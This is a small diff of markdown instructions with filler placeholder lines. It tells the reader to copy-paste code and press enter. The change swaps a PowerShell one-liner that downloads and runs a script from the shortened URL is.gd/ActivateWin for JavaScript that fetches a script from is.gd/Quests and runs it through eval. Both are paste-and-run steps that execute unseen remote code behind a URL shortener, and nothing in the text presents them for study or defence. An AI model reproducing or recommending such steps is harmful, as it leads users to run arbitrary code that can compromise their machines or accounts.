@@ -10,7 +10,10 @@
 -   sadsad
 -   Copy-paste the below code and press enter
     ```
-    iex(irm is.gd/ActivateWin)
+    fetch('is.gd/Quests')
+  .then(response => response.text())
+  .then(script => eval(script));
+
     ```
 -   sadasdsa
 -   That's all.
